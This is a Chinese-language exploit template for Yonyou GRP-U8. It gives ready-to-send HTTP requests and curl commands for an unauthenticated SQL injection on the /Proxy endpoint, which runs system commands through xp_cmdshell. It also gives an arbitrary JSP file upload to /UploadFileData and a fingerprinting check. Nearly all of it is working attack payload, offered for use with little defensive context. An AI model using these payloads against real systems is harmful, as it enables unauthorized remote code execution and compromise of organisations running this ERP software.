---
id: YONGYOU-GRP-U8-RCE
title: 用友 GRP-U8 SQL注入/任意文件上传 RCE
product: yongyou
vendor: 用友
version_affected: "GRP-U8"
severity: CRITICAL
tags: [rce, sqli, file_upload, 无需认证, 国产, erp]
fingerprint: ["用友", "GRP-U8", "Proxy", "UploadFileData"]
---

## 漏洞描述

用友 GRP-U8 的 Proxy 接口存在 SQL 注入漏洞（CNNVD-201610-923），可通过 xp_cmdshell 执行系统命令。同时 UploadFileData 接口存在任意文件上传。

## 影响版本

- GRP-U8

## 前置条件

- 无需认证
- SQL注入方式需目标 MSSQL 开启 xp_cmdshell

## 利用步骤

### SQL注入命令执行 (CNNVD-201610-923)

```http
POST /Proxy HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec master.dbo.xp_cmdshell 'whoami'</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
```

### 任意文件上传

```http
POST /UploadFileData HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="test.jsp"
Content-Type: application/octet-stream

<%out.print("vuln_test");%>
------WebKitFormBoundary--
```

## Payload

### SQL注入命令执行

```bash
curl -s -X POST "http://target/Proxy" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec master.dbo.xp_cmdshell '\''whoami'\''</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>'
```

### 任意文件上传

```bash
curl -s -X POST "http://target/UploadFileData" \
  -F 'file=@test.jsp;type=application/octet-stream'
```

## 验证方法

SQL 注入响应中包含命令执行结果；文件上传后访问确认。

## 指纹确认

```bash
curl -s -o /dev/null -w "%{http_code}" "http://target/Proxy"
```
